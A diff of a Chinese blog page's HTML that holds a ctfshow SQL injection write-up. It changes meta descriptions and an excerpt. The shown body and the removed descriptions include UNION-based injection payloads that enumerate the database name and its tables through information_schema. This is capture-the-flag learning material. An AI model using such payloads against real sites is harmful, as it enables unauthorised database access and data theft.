@@ -8,17 +8,17 @@
   <link rel="dns-prefetch" href="http://example.com">
   <title>ctfshow入门sql注入部分 | 林北在这里呀</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="171观察可以采用报错注入，无任何过滤，观察发现是 ‘ 的闭合 select测试字段，发现字段为2个 1.查库：100&#39; union select 1,2,database() --+  2.查表：100’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;">
+  <meta name="description" content="ctfshow web入门 sql注入部分(不断更新)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow入门sql注入部分">
 <meta property="og:url" content="http://example.com/2020/11/14/[ctfshow%E5%85%A5%E9%97%A8sql%E6%B3%A8%E5%85%A5%E9%83%A8%E5%88%86]/index.html">
 <meta property="og:site_name" content="林北在这里呀">
-<meta property="og:description" content="171观察可以采用报错注入，无任何过滤，观察发现是 ‘ 的闭合 select测试字段，发现字段为2个 1.查库：100&#39; union select 1,2,database() --+  2.查表：100’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;">
+<meta property="og:description" content="ctfshow web入门 sql注入部分(不断更新)">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
 <meta property="og:image" content="https://s3.ax1x.com/2020/11/14/DCAlSf.png">
 <meta property="article:published_time" content="2020-11-14T04:58:15.000Z">
-<meta property="article:modified_time" content="2021-01-03T12:03:36.293Z">
+<meta property="article:modified_time" content="2021-01-03T12:06:41.951Z">
 <meta property="article:author" content="Wh1tecell">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s3.ax1x.com/2020/11/14/DCAtTs.png">
@@ -169,7 +169,10 @@
         
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="171"><a href="#171" class="headerlink" title="171"></a>171</h2><p>观察可以采用报错注入，无任何过滤，观察发现是 ‘ 的闭合</p>
+        <p>ctfshow web入门 sql注入部分(不断更新)</p>
+<a id="more"></a>
+
+<h2 id="171"><a href="#171" class="headerlink" title="171"></a>171</h2><p>观察可以采用报错注入，无任何过滤，观察发现是 ‘ 的闭合</p>
 <p>select测试字段，发现字段为2个</p>
 <p>1.查库：<code>100&#39; union select 1,2,database() --+</code> </p>
 <p>2.查表：<code>100’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p>
